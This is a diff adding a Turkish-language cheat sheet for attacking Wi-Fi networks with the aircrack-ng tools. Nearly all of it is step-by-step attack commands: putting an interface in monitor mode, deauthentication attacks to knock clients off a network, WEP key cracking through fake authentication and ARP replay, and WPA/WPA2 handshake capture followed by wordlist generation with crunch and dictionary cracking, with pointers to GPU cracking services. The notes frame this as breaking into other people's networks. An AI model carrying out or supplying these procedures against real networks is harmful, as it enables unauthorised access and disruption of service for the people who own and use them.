@@ -1,0 +1,124 @@
+---------------Hazırlık Monitor Mod Açma------------
+ifconfig <interface> down
+iwconfig <interface> mode monitor
+ifconfig <interface> up
+
+--->Monitör Mod Kapatma
+ifconfig <interface> down
+iwconfig <interface> mode managed
+ifconfig <interface> up
+
+service NetworkManager restart
+
+------------------------Modemler ve Bağlı Cihazlar--------------
+
+1. aşama: airodump-ng <interface>  //modemler hakkında bilgileri listeler
+
+2.aşama: airodump-ng --channel <channel> --bssid <bssid> --write <filename> <interface>
+
+3. aşama (Deauth Saldirisi): 
+
+aireplay-ng --deauth <#packets-number-you-want-to-send> -a <AP> <interface> //for all targets to deauth attact
+
+aireplay-ng --deauth <#packets-number-you-want-to-send> -a <AP> -c <target> <interface> //for a spesific target to deauth attact
+
+
+
+
+
+
+--------------------------WEP ŞİFRESİ KIRMA-------------------
+
+
+intialization vektor(IV) \\modem ile haberleşmek için gerkli. IV ler ele geçirilebilir.
+
+1. aşama: airodump-ng <interface>  //modemler hakkında bilgileri listeler
+
+2.aşama: airodump-ng --channel <channel> --bssid <bssid> --write <filename> <interface>
+
+3. aşama: aircrack-ng <filename-01.cap> //weplerde şifre hemen bulunur bu kodu yazdıktan sonra ama eğer internet hedef için kullanılmıyorsa 
+o zaman IV'leri yakalamak için <Sahte-Yetkilendirme-Saldirisi> yapılır.
+
+-->Sahte-Yetkilendirme
+
+
+1. aşama: airodump-ng <interface>  //modemler hakkında bilgileri listeler
+
+2.aşama: airodump-ng --channel <channel> --bssid <bssid> --write <filename> <interface>
+
+3.aşama: aireplay --fakeauth <kaç-kere-saldırı-yapmak-istiyorsan-o-sayı-yazılır-0-yazman-önerilir> -a <modemin_mac_addresi> -h <kendi-mac_adresimiz> <interface> //bu aşmama senin modeme sahte bir şekilde bağlanmanı sağlayacak
+
+
+ip addr //mac adreslerini verir.
+
+4.aşama: aireplay --arpreplay -b <modemin_mac_addresi> -h <kendi-mac_adresimiz> <interface> //bu aşamada modeme paketler gönderilip alınarak IV'ler yakalanamya çalışılacak.
+
+5.aşama: aircrack-ng <filename-01.cap> 
+
+
+
+
+
+------------------WPA\WPA2 Şifresi Kırma-------------------
+
+IV'ler artık açık bir şekilde yollanmıyor.
+
+-Handshake
+-Wordlist
+
+//Deneyerek Bulma
+
+--->Handshake Yakalamk
+
+
+1. aşama: airodump-ng <interface>  //modemler hakkında bilgileri listeler
+
+2.aşama: airodump-ng --channel <channel> --bssid <bssid> --write <handshake-file> <interface>
+
+\\2. aşamadan sonra birileri ağa bağlanırsa handshake yakalanır ve üste görünür
+
+Not: Eğer kimse ağa bağlanmazsa o zaman dedos saldırısı yaparız. Onu ağdan kendimiz düşürürüz.
+
+Yapalım!
+
+1.aşama: aireplay-ng --deauth 5 -a <mac-adress-of-modem> -c <targests-mac>
+<interface>
+
+2.aşama: //wordlist oluşturma
+
+
+crunch <min> <max> [options]
+
+forexample: crunch 6 6 1232433abcdefd -o 6chars.txt
+
+3.aşama: aircrack-ng <handshakefile.cap> -w <6chars.text>
+
+//ve sonuç eğer listede o modemin şifresi varsa kırılır.
+
+
+
+-------------Word List Alternatifleri----------
+
+1-)
+gpu hash cracking // internet üzerinde sizin yerinize ssid ve bssid girerek sizden daha hızlı bir şekilde parolanızı bulabilirler.
+
+
+2-) /usr/share/wordlists klosörünün altında linuxun kendi wordlistleri bulunuyor.
+
+3-) Türkçe wordlist kullanabilirsin. İnternette var.
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
